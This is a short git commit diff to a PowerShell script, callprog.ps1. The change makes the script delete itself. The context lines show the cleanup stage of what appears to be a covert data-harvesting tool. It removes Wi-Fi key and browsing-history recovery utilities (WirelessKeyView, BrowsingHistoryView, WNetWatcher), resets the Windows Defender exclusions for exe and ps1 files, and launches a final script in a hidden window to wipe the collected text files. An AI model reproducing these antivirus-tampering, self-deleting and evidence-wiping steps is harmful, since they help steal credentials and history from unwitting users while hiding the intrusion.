9bbadce31eec90444c4e2ae75f39c297ba468bb2
ATAUL MUSTAFA <30733121+mustafa786ataul@users.noreply.github.com>
2022-10-30 03:58:16 +0530

    Update callprog.ps1

--- callprog.ps1
+++ callprog.ps1
@@ -31,7 +31,7 @@ Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
 Remove-Item WirelessKeyView.exe
-Remove-Item ciaoV2.ps1
+Remove-Item callprog.ps1
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
